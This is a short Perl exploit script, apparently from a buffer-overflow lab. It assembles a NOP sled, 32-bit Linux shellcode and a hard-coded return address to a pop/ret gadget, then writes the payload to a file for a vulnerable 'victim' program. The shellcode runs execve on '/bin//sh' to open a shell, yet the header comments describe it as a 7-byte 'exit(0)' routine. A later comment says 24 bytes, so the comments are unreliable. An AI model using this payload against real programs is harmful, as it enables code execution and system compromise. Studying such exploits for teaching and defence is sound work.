#!/usr/bin/perl
 
# shellcode for exit(0)
#
 
# NOTE: "." is a perl way to cat two strings (NOT part of shellcode)
# This shellcode takes 7 bytes

my $shellcode =
"\x31\xc0".			# xorl		%eax, %eax
"\x50".				# pushl	%eax
"\x68\x6e\x2f\x73\x68".		# pushl        $0x68732f6e
"\x68\x2f\x2f\x62\x69".		# pushl	$0x69622f2f
"\x89\xe3" .			# movl         %esp, %ebx
"\x99".				# cltd
"\x52".				# pushl        %edx
"\x53".				# pushl        %ebx
"\x89\xe1".		        # movl         %esp, %ecx
"\xb0\x0b" .                    # movb         $0xb, %al
"\xcd\x80"                      # int          $0x80
;
# This address must match the address of the pop and ret instruction sequence
# 80484d8:	5d                   	pop    %ebp
# 80484d9:	c3                   	ret    
#80484cb:	5d                   	pop    %ebp
#80484cc:	c3                   	ret    
#
my $retaddr = "\xcb\x84\x04\x08"; 
#my $retaddr = "\xcc\x84\x04\x08"; #0x08 04 84 0e
 

# Fill NOP instruction
my $pad = "\x90" x 244; 

#arg is the total size of the payload, we know the retaddr size = 4 and we know the shellcode size is 24
# Input string to our victim's program
my $arg = $pad.$shellcode.$retaddr;
 
# Let us store the input string to a file
open OUT, "> payloadret2pop";
print OUT $arg;
close OUT;
